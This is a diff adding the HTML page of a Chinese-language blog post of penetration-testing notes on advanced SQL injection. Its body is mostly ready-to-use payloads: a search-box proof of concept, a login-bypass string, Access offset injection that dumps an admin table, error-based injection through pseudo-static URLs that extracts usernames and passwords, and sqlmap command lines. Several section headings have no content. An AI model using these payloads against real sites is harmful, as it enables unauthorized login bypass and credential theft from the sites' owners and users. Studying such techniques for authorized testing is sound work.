@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="cookie中转注入https:&#x2F;&#x2F;wenku.baidu.com&#x2F;view&#x2F;99f7ce57ad02de80d4d840c1.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web渗透笔记之sql注入（进阶篇）">
+<meta property="og:url" content="http://yoursite.com/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/index.html">
+<meta property="og:site_name" content="yida223&#39; blog">
+<meta property="og:description" content="cookie中转注入https:&#x2F;&#x2F;wenku.baidu.com&#x2F;view&#x2F;99f7ce57ad02de80d4d840c1.html">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/pasted-12.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-13.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-14.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-15.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-16.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-17.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-18.png">
+<meta property="article:published_time" content="2019-04-03T13:12:00.000Z">
+<meta property="article:modified_time" content="2019-08-09T16:06:55.812Z">
+<meta property="article:author" content="yida223">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-12.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web渗透笔记之sql注入（进阶篇） | yida223' blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">yida223' blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BF%9B%E9%98%B6%E7%AF%87%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yida223">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yida223' blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web渗透笔记之sql注入（进阶篇）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-03 21:12:00" itemprop="dateCreated datePublished" datetime="2019-04-03T21:12:00+08:00">2019-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-10 00:06:55" itemprop="dateModified" datetime="2019-08-10T00:06:55+08:00">2019-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">渗透之路</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="cookie中转注入"><a href="#cookie中转注入" class="headerlink" title="cookie中转注入"></a>cookie中转注入</h1><p><a href="https://wenku.baidu.com/view/99f7ce57ad02de80d4d840c1.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/99f7ce57ad02de80d4d840c1.html</a></p>
+<a id="more"></a>
+<p><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" alt="upload successful"></p>
+<p><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p><img src="/images/pasted-17.png" alt="upload successful"></p>
+<p><img src="/images/pasted-18.png" alt="upload successful"></p>
+<h1 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a>搜索框注入</h1><p><strong>poc:</strong><br><code>1%&#39; and &#39;%1%&#39;=&#39;%1</code>  返回正常<br><code>1%&#39; and &#39;%1%&#39;=&#39;%2</code>  无返回结果</p>
+<p>关键字=’ and [查询条件] and ‘%’=’<br><strong>例：</strong><br>select * from 表名 where 字段 like ‘%<strong>‘ and 1=1 and ‘%’=’</strong>%’</p>
+<hr>
+<h1 id="登录框注入语句"><a href="#登录框注入语句" class="headerlink" title="登录框注入语句"></a>登录框注入语句</h1><pre><code>a&apos; or (select count(*) from admin)&gt;0 and &apos;1&apos;=&apos;1</code></pre><hr>
+<h1 id="偏移注入（Access）"><a href="#偏移注入（Access）" class="headerlink" title="偏移注入（Access）"></a>偏移注入（Access）</h1><p>偏移注入主要是针对知道表，但是不知道字段的。</p>
+<h4 id="00x1-判断字段数"><a href="#00x1-判断字段数" class="headerlink" title="00x1 判断字段数"></a>00x1 判断字段数</h4><blockquote>
+<p><a href="http://www.test.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.test.com/newslist.asp?id=1</a> order by 19 #错误<br><a href="http://www.test.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.test.com/newslist.asp?id=1</a> order by 18 #正确</p>
+</blockquote>
+<h4 id="00x2-爆出显示位"><a href="#00x2-爆出显示位" class="headerlink" title="00x2 爆出显示位"></a>00x2 爆出显示位</h4><blockquote>
+<p><a href="http://wwwxxx/newslist.asp?id=1" target="_blank" rel="noopener">http://wwwxxx/newslist.asp?id=1</a> UNION SELECT<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin</p>
+</blockquote>
+<h4 id="00x3-判断表内存在的字段数"><a href="#00x3-判断表内存在的字段数" class="headerlink" title="00x3 判断表内存在的字段数"></a>00x3 判断表内存在的字段数</h4><p>接下来我们利用“*”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。</p>
+<p>复制代码</p>
+<blockquote>
+<p><a href="http://www.xxx/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin     #错误<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin        #错误<br>………<br><a href="http://www.xxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://www.xxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确</p>
+</blockquote>
+<p>复制代码<br>说明了sys_admin表下有11个字段。</p>
+<p>偏移注入的基本公式为:</p>
+<blockquote>
+<p> order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案<br>也就是18-11=7<br>18-7x2=4<br>得到答案等于：4</p>
+</blockquote>
+<p>然后依旧是套公式的过程。</p>
+<blockquote>
+<p><a href="http://wwwxxx.com/newslist.asp?id=1" target="_blank" rel="noopener">http://wwwxxx.com/newslist.asp?id=1</a> union select<br>1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on<br>a.id = b.id)</p>
+</blockquote>
+<p>#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。<br>#后面的是sql，可作公式。<br>如此便爆出了账号密码。</p>
+<hr>
+<h1 id="DNSLOG-注入"><a href="#DNSLOG-注入" class="headerlink" title="DNSLOG 注入"></a>DNSLOG 注入</h1><hr>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><hr>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><hr>
+<h1 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h1><hr>
+<h1 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h1><p>伪静态，主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以就可能存在sql注入。</p>
+<ol>
+<li>判断页面是静态还是伪静态：</li>
+</ol>
+<ul>
+<li>F12打开控制台，输入<code>alert(document.lastModified);</code><br>多次刷新网页，用同样的方法，比较弹窗的时间，如果都是一样的，那就是真实的静态网页，否则就是伪静态（动态网页）。</li>
+</ul>
+<ol start="2">
+<li><p>中转注入法<br>通过 <a href="http://www.xxx.com/news.php?id=1" target="_blank" rel="noopener">http://www.xxx.com/news.php?id=1</a> 做了伪静态之后就成这样了<br><a href="http://www.xxx.com/news.php/id/1.html" target="_blank" rel="noopener">http://www.xxx.com/news.php/id/1.html</a> 刺猬写的COOKIES注入中转器的get方式注入的代码修改了一下，只要把注入的参数写成1 ，然后在提交的语句后面加上.html那么就可以直接放到注入软件注入了。</p>
+</li>
+<li><p>手工注入法</p>
+<ol>
+<li><p> <a href="http://www.xxx.com/play/Diablo.html" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo.html</a></p>
+<p> <a href="http://www.xxx.com/down/html/?772.html" target="_blank" rel="noopener">http://www.xxx.com/down/html/?772.html</a></p>
+</li>
+<li><p>测试注入：</p>
+<blockquote>
+<p><a href="http://www.xxx.com/down/html/?772-1.html" target="_blank" rel="noopener">http://www.xxx.com/down/html/?772-1.html</a>  //若页面发生变化，则存在注入<br><a href="http://www.xxx.com/play/Diablo&#39;.html" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;.html</a><br><a href="http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;1" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;1</a> /<em>.html<br><a href="http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;2" target="_blank" rel="noopener">http://www.xxx.com/play/Diablo&#39;/**/and/**/1=&#39;2</a> /</em>.html<br><a href="http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html" target="_blank" rel="noopener">http://www.xxx.com/page/html/?56′/**/and/**/1=1/*.html</a> 正常<br><a href="http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html" target="_blank" rel="noopener">http://www.xxx.com/page/html/?56′/**/and/**/1=2/*.html</a> 出错</p>
+</blockquote>
+</li>
+<li><p>手工注入注意<br> <a href="http://www.xxx.net/news/html/?410.html" target="_blank" rel="noopener">http://www.xxx.net/news/html/?410.html</a></p>
+<pre><code>`http://www.xxx.net/news/html/410&apos;union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where&apos;1&apos;=&apos;1.html`</code></pre><p><code>注：
+伪静态的注入和URL的普通GET注入不太相同
+。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用/**/这个注释符号表示空格。</code></p>
+</li>
+</ol>
+</li>
+<li><p>SQLmap方法</p>
+<p> 在sqlmap中伪静态哪儿存在注入点就加*</p>
+<blockquote>
+<p><a href="http://www.cunlide.com/id1/1/id2/2" target="_blank" rel="noopener">http://www.cunlide.com/id1/1/id2/2</a></p>
+<pre><code>python   sqlmap.py -u “http://www.xxx.com/id1/1*/id2/2″</code></pre></blockquote>
+<blockquote>
+<p><a href="http://www.xxx.com/news/class/?103.htm" target="_blank" rel="noopener">http://www.xxx.com/news/class/?103.htm</a></p>
+<pre><code>python  sqlmap.py -u  “http://www.xxx.com/news/class/?103*.html”</code></pre></blockquote>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/02/web%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/" rel="prev" title="web渗透笔记之sql注入（基础篇）">
+      <i class="fa fa-chevron-left"></i> web渗透笔记之sql注入（基础篇）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/03/eb%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%E4%B9%8Bxss%E6%BC%8F%E6%B4%9E/" rel="next" title="web渗透笔记之xss漏洞">
+      web渗透笔记之xss漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie中转注入"><span class="nav-number">1.</span> <span class="nav-text">cookie中转注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#搜索框注入"><span class="nav-number">2.</span> <span class="nav-text">搜索框注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#登录框注入语句"><span class="nav-number">3.</span> <span class="nav-text">登录框注入语句</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#偏移注入（Access）"><span class="nav-number">4.</span> <span class="nav-text">偏移注入（Access）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#00x1-判断字段数"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">00x1 判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00x2-爆出显示位"><span class="nav-number">4.0.0.2.</span> <span class="nav-text">00x2 爆出显示位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00x3-判断表内存在的字段数"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">00x3 判断表内存在的字段数</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNSLOG-注入"><span class="nav-number">5.</span> <span class="nav-text">DNSLOG 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入"><span class="nav-number">6.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">7.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XFF注入"><span class="nav-number">8.</span> <span class="nav-text">XFF注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#伪静态注入"><span class="nav-number">9.</span> <span class="nav-text">伪静态注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yida223</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮，吾将上下而求索</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yida223</span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动-->
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
